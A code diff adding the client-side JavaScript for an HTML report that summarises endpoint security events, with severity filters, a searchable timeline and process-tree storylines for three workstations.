+const SUMMARY    = {"total":20,"time_start":"2026-04-15T14:02:11.123000+00:00","time_end":"2026-04-15T14:17:01.118000+00:00","endpoints":["WS-DESIGN-02","WS-FINANCE-01","WS-MARKETING-04"],"event_types":{"Process Creation":12,"DNS Resolved":2,"IP Connect":2,"File Creation":2,"Registry Value Modified":1,"Module Load":1},"storylines":3};
+
+(function() {
+  const STATE = {
+    severities: new Set(['low', 'medium', 'high']),  // 'noise' off by default
+    categories: new Set(),                            // empty = all
+    search: '',
+  };
+
+  const SEV_COLOR = { noise: 'sev-noise', low: 'sev-low', medium: 'sev-medium', high: 'sev-high' };
+
+  function escapeHTML(s) {
+    if (s === null || s === undefined) return '';
+    return String(s)
+      .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+  }
+
+  function fmtTime(iso) {
+    if (!iso) return '';
+    try {
+      const d = new Date(iso);
+      const pad = (n, w=2) => String(n).padStart(w, '0');
+      return `${d.getFullYear()}-${pad(d.getMonth()+1)}-${pad(d.getDate())} ` +
+             `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}.${pad(d.getMilliseconds(),3)}`;
+    } catch (_) { return iso; }
+  }
+
+  // ----- Summary -----
+  function renderSummary() {
+    const el = document.getElementById('summary-grid');
+    const sevCounts = { noise: 0, low: 0, medium: 0, high: 0 };
+    EVENTS.forEach(e => { sevCounts[e.severity] = (sevCounts[e.severity] || 0) + 1; });
+
+    const tStart = SUMMARY.time_start ? fmtTime(SUMMARY.time_start) : '—';
+    const tEnd   = SUMMARY.time_end   ? fmtTime(SUMMARY.time_end)   : '—';
+
+    const epList = (SUMMARY.endpoints || []).slice(0, 3).join(', ');
+    const epSub = SUMMARY.endpoints.length > 3 ? `${epList}, +${SUMMARY.endpoints.length - 3} more` : epList;
+
+    el.innerHTML = `
+      <div class="card"><div class="label">Total Events</div><div class="value">${SUMMARY.total.toLocaleString()}</div><div class="sub">in dataset</div></div>
+      <div class="card sev-high"><div class="label">High</div><div class="value">${sevCounts.high}</div><div class="sub">${pct(sevCounts.high, SUMMARY.total)}</div></div>
+      <div class="card sev-medium"><div class="label">Medium</div><div class="value">${sevCounts.medium}</div><div class="sub">${pct(sevCounts.medium, SUMMARY.total)}</div></div>
+      <div class="card sev-low"><div class="label">Low</div><div class="value">${sevCounts.low}</div><div class="sub">${pct(sevCounts.low, SUMMARY.total)}</div></div>
+      <div class="card"><div class="label">Storylines</div><div class="value">${SUMMARY.storylines}</div><div class="sub">distinct chains</div></div>
+      <div class="card"><div class="label">Endpoints</div><div class="value">${SUMMARY.endpoints.length}</div><div class="sub">${escapeHTML(epSub)}</div></div>
+      <div class="card"><div class="label">Window Start</div><div class="value" style="font-size:13px">${escapeHTML(tStart)}</div></div>
+      <div class="card"><div class="label">Window End</div><div class="value" style="font-size:13px">${escapeHTML(tEnd)}</div></div>
+    `;
+  }
+
+  function pct(n, total) {
+    if (!total) return '0%';
+    return ((n / total) * 100).toFixed(1) + '%';
+  }
+
+  // ----- Filters -----
+  function renderFilters() {
+    // Severity toggles
+    const sevWrap = document.getElementById('filter-sev');
+    ['noise', 'low', 'medium', 'high'].forEach(s => {
+      const btn = document.createElement('button');
+      btn.className = 'toggle ' + SEV_COLOR[s];
+      btn.dataset.sev = s;
+      btn.textContent = s;
+      if (STATE.severities.has(s)) btn.classList.add('active');
+      btn.addEventListener('click', () => {
+        if (STATE.severities.has(s)) STATE.severities.delete(s);
+        else STATE.severities.add(s);
+        btn.classList.toggle('active');
+        renderTimeline();
+      });
+      sevWrap.appendChild(btn);
+    });
+
+    // Category toggles
+    const catWrap = document.getElementById('filter-cat');
+    const cats = [...new Set(EVENTS.map(e => e.category))].sort();
+    cats.forEach(c => {
+      const btn = document.createElement('button');
+      btn.className = 'toggle';
+      btn.dataset.cat = c;
+      btn.textContent = c;
+      btn.addEventListener('click', () => {
+        if (STATE.categories.has(c)) STATE.categories.delete(c);
+        else STATE.categories.add(c);
+        btn.classList.toggle('active');
+        renderTimeline();
+      });
+      catWrap.appendChild(btn);
+    });
+
+    document.getElementById('filter-search').addEventListener('input', (ev) => {
+      STATE.search = ev.target.value.toLowerCase();
+      renderTimeline();
+    });
+  }
+
+  // ----- Timeline -----
+  function passesFilters(e) {
+    if (!STATE.severities.has(e.severity)) return false;
+    if (STATE.categories.size > 0 && !STATE.categories.has(e.category)) return false;
+    if (STATE.search) {
+      // Build a search blob lazily once per event
+      if (!e._searchBlob) {
+        e._searchBlob = (
+          e.proc_name + ' ' + e.parent_name + ' ' + e.event_type + ' ' +
+          e.endpoint + ' ' + (e.flags || []).join(' ') + ' ' +
+          Object.values(e.detail || {}).join(' ')
+        ).toLowerCase();
+      }
+      if (!e._searchBlob.includes(STATE.search)) return false;
+    }
+    return true;
+  }
+
+  function renderTimeline() {
+    const events = EVENTS.filter(passesFilters);
+    const container = document.getElementById('timeline-list');
+    document.getElementById('timeline-count').textContent =
+      `${events.length.toLocaleString()} of ${EVENTS.length.toLocaleString()} events shown`;
+
+    if (events.length === 0) {
+      container.innerHTML = '<div class="empty">No events match current filters.</div>';
+      return;
+    }
+
+    // Render in chunks for large datasets
+    const HARD_CAP = 5000;
+    const slice = events.slice(0, HARD_CAP);
+    const html = slice.map(renderEvent).join('');
+    container.innerHTML = html;
+    if (events.length > HARD_CAP) {
+      container.insertAdjacentHTML('beforeend',
+        `<div class="empty">Display capped at ${HARD_CAP.toLocaleString()}. Refine filters to see more.</div>`);
+    }
+
+    // Wire up click-to-expand
+    container.querySelectorAll('.event').forEach(row => {
+      row.addEventListener('click', () => row.classList.toggle('expanded'));
+    });
+  }
+
+  function renderEvent(e) {
+    const flags = (e.flags || []).map(f => `<span class="flag">${escapeHTML(f)}</span>`).join(' ');
+    const detail = Object.entries(e.detail || {}).map(([k, v]) =>
+      `<div class="k">${escapeHTML(k)}</div><div class="v">${escapeHTML(v)}</div>`
+    ).join('');
+    const parentLine = e.parent_name
+      ? `<div class="k">parent</div><div class="v">${escapeHTML(e.parent_name)} <span style="color:var(--muted)">(pid ${escapeHTML(e.parent_pid)})</span></div>`
+      : '';
+    const userLine = e.proc_user
+      ? `<div class="k">user</div><div class="v">${escapeHTML(e.proc_user)}</div>`
+      : '';
+    const slLine = e.storyline
+      ? `<div class="k">storyline</div><div class="v" style="color:var(--accent)">${escapeHTML(e.storyline)}</div>`
+      : '';
+
+    return `
+      <div class="event ${SEV_COLOR[e.severity]}">
+        <div class="event-line">
+          <span class="ts">${escapeHTML(fmtTime(e.ts))}</span>
+          <span class="pill ${SEV_COLOR[e.severity]}">${escapeHTML(e.severity)}</span>
+          <span class="pill cat">${escapeHTML(e.category)}</span>
+          <span class="ep">${escapeHTML(e.endpoint)}</span>
+          <span class="pname">${escapeHTML(e.proc_name)} <span class="pid">(${escapeHTML(e.proc_pid)})</span></span>
+          <span class="et">${escapeHTML(e.event_type)}</span>
+          ${flags}
+        </div>
+        <div class="event-detail">
+          <div class="detail-grid">
+            ${parentLine}
+            ${userLine}
+            ${slLine}
+            ${detail}
+          </div>
+        </div>
+      </div>
+    `;
+  }
+
+  // ----- Process trees -----
+  function renderTrees() {
+    const container = document.getElementById('tree-container');
+    const sids = Object.keys(STORYLINES);
+    if (sids.length === 0) {
+      container.innerHTML = '<div class="empty">No storylines in dataset.</div>';
+      return;
+    }
+
+    // Sort storylines by max severity (high first), then earliest event
+    const sorted = sids.map(sid => {
+      const roots = STORYLINES[sid];
+      const maxSev = computeMaxSev(roots);
+      const earliest = computeEarliest(roots);
+      return { sid, roots, maxSev, earliest };
+    }).sort((a, b) => {
+      const sevOrder = { high: 3, medium: 2, low: 1, noise: 0 };
+      const d = (sevOrder[b.maxSev] || 0) - (sevOrder[a.maxSev] || 0);
+      if (d !== 0) return d;
+      return (a.earliest || '').localeCompare(b.earliest || '');
+    });
+
+    container.innerHTML = sorted.map(({ sid, roots, maxSev }) => {
+      const sidShort = sid.length > 32 ? sid.substring(0, 32) + '…' : sid;
+      const isOpen = maxSev === 'high' || maxSev === 'medium' ? 'open' : '';
+      return `
+        <details class="storyline" ${isOpen}>
+          <summary>
+            <span>storyline:</span><span class="sid">${escapeHTML(sidShort)}</span>
+            <span class="roll">
+              <span class="pill ${SEV_COLOR[maxSev]}">${escapeHTML(maxSev)}</span>
+              <span class="pill cat">${roots.length} root${roots.length === 1 ? '' : 's'}</span>
+            </span>
+          </summary>
+          <div class="tree">${roots.map(r => renderNode(r, 0)).join('')}</div>
+        </details>
+      `;
+    }).join('');
+  }
+
+  function computeMaxSev(roots) {
+    const sevOrder = { noise: 0, low: 1, medium: 2, high: 3 };
+    let max = 'noise';
+    function walk(n) {
+      if ((sevOrder[n.severity] || 0) > (sevOrder[max] || 0)) max = n.severity;
+      (n.children || []).forEach(walk);
+    }
+    roots.forEach(walk);
+    return max;
+  }
+  function computeEarliest(roots) {
+    let earliest = null;
+    function walk(n) {
+      if (n.first_seen && (!earliest || n.first_seen < earliest)) earliest = n.first_seen;
+      (n.children || []).forEach(walk);
+    }
+    roots.forEach(walk);
+    return earliest;
+  }
+
+  function renderNode(n, depth) {
+    const flags = (n.flags || []).slice(0, 6).map(f =>
+      `<span class="flag">${escapeHTML(f)}</span>`).join(' ');
+    const verifiedBadge = n.verified
+      ? `<span class="pill cat" style="font-size:9px">${escapeHTML(n.verified)}</span>`
+      : '';
+    const cmdline = (n.cmdline || n.path || '').trim();
+    const cmdlineHTML = cmdline ? `<div class="tree-cmdline">${escapeHTML(cmdline)}</div>` : '';
+    const childrenHTML = (n.children || []).length
+      ? `<div class="tree-children">${n.children.map(c => renderNode(c, depth + 1)).join('')}</div>`
+      : '';
+    return `
+      <div class="tree-node ${SEV_COLOR[n.severity]}">
+        <div class="tree-row">
+          <span class="pill ${SEV_COLOR[n.severity]}">${escapeHTML(n.severity)}</span>
+          <span class="pname">${escapeHTML(n.name || '(unknown)')}</span>
+          <span class="pid">pid ${escapeHTML(n.pid)}</span>
+          <span class="ec">${n.event_count} event${n.event_count === 1 ? '' : 's'}</span>
+          ${verifiedBadge}
+          ${flags}
+        </div>
+        ${cmdlineHTML}
+        ${childrenHTML}
+      </div>
+    `;
+  }
+
+  // ----- Boot -----
+  renderSummary();
+  renderFilters();
+  renderTrees();
+  renderTimeline();
+})();
+
+</script>
+</body>
+</html>
